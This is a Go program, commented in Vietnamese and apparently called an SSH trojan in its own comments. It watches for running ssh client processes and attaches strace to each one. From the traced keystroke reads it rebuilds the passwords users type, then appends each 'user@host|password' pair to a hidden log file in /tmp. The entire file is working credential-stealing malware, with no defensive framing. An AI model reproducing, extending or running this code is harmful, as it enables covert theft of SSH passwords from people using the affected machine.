package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

type ProcessesType [][]string

type RunningType struct {
	pid    string
	status bool
	done   bool
}

type PidStatus []RunningType

var (
	command = []string{"-c", "ps aux | awk '$11 = \"ssh\"'| awk '$12 ~ \"@\"' "}
)

func (s PidStatus) Contains(id string) bool {
	for _, v := range s {
		if v.pid == id {
			return true
		}
	}
	return false
}

// query process instance
func (s PidStatus) Query(id string) RunningType {
	for _, v := range s {
		if v.pid == id {
			return v
		}
	}
	return RunningType{
		pid:    id,
		status: false,
		done:   false,
	}
}

// add 1 process vao instance
func (s *PidStatus) Add(p RunningType) {
	*s = append(*s, p)
}

// set trang thai cua process
func (s *PidStatus) SetStatus(id string, status, done bool) {
	for i, v := range *s {
		if v.pid == id {
			(*s)[i] = RunningType{
				pid:    id,
				status: status,
				done:   done,
			}
			break
		}
	}
}

// write password vao file log_sshtrojan
func writeLog(s string) {
	f, err := os.OpenFile("/tmp/.log_sshtrojan2.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := f.Write([]byte(s + "\n")); err != nil {
		log.Fatal(err)
	}
	if err := f.Close(); err != nil {
		log.Fatal(err)
	}
}

func runStrace(pid string) {
	// run struce va ghi log vao file pid_<pid>.txt
	straceCommand := []string{"-c", fmt.Sprintf("strace -e trace=read,write -p %s -o /tmp/pid_%s.log", pid, pid)}
	cmd := exec.Command("bash", straceCommand...)
	err := cmd.Run()
	if err != nil {
		log.Println(err.Error())
	}
}

// regex string theo groups
func getParams(regEx, s string) (paramsMap map[string]string) {
	var compRegEx = regexp.MustCompile(regEx)
	match := compRegEx.FindStringSubmatch(s)
	paramsMap = make(map[string]string)
	for i, name := range compRegEx.SubexpNames() {
		if i > 0 && i <= len(match) {
			paramsMap[name] = match[i]
		}
	}
	return paramsMap
}

func reverseSlice(s []string) (rs []string) {
	for i := range s {
		tmp := s[len(s)-1-i]
		rs = append(rs, tmp)
	}
	return
}

func splitPassword(log []string, agent string) string {
	tmpLog := []string{}
	trimLog := map[string]int{
		"start": 0,
		"end":   0,
	}
	// lay cac dong co chua password
	for i, v := range log {
		if strings.Contains(v, "write(5, \"Welcome") {
			trimLog["start"] = i
		}
		if strings.Contains(v, "write(4, \""+agent) {
			trimLog["end"] = i
			break
		}
	}
	if trimLog["start"] == 0 {
		return ""
	}
	for trimLog["end"] == 0 {
		trimLog["end"] = len(log)
	}
	for i := trimLog["start"]; i < trimLog["end"]; i++ {
		tmpLog = append(tmpLog, log[i])
	}
	tmpPassword := []string{}
	for _, v := range tmpLog {
		tmpPassword = append(tmpPassword, getParams(`(?m)read\(4, \"(?P<Char>.*)\", 1\)`, v)["Char"])
	}
	tmpPassword = reverseSlice(tmpPassword)
	passwordSlice := []string{}
	for _, v := range tmpPassword {
		if v == "\\n" {
			break
		}
		passwordSlice = append(passwordSlice, v)
	}
	return strings.Join(passwordSlice, "")
}

func getPassword(p []string) (string, bool) {
	// read file pid_<pid>.log
	body, err := ioutil.ReadFile("/tmp/pid_" + p[1] + ".log")
	if err != nil {
		log.Fatalf("unable to read file: %v", err)
	}
	lines := strings.Split(string(body), "\n")
	// reverse cac dong trong file log de lay dong co chua read(6 dau tien va cung la password dung
	reversedLines := reverseSlice(lines)
	if password := splitPassword(reversedLines, p[11]); password != "" {
		return password, true
	}
	return "", false
}

func checkLoginDone(p []string, pids *PidStatus) {
	if password, ok := getPassword(p); ok {
		writeLog(fmt.Sprintf("%s|%s", p[11], password))
		// write log xong thi xet trang thai done ve true
		(*pids).SetStatus(p[1], false, true)
	}
}

func deleteProcessLog(id string) {
	os.Remove("/tmp/pid_" + id + ".log")
}

func main() {
	var pids PidStatus
	for {
		time.Sleep(time.Second / 2)
		cmd := exec.Command("bash", command...)
		stdout, err := cmd.Output()
		if err != nil {
			fmt.Println(err.Error())
			return
		}
		listProcesses := strings.Split(string(stdout), "\n")
		if len(listProcesses) == 0 {
			continue
		}
		processes := ProcessesType{}
		for _, v := range listProcesses {
			fields := strings.Split(v, " ")
			if len(fields) == 12 {
				processes = append(processes, fields)
			}
		}
		for _, v := range processes {
			if pids.Contains(v[1]) {
				if pids.Query(v[1]).done {
					deleteProcessLog(v[1])
					continue
				}
				if pids.Query(v[1]).status {
					checkLoginDone(v, &pids)
				} else {
					go runStrace(v[1])
					pids.SetStatus(v[1], true, false)
				}
			} else {
				pids.Add(RunningType{
					pid:    v[1],
					status: false,
					done:   false,
				})
			}
		}
	}
}
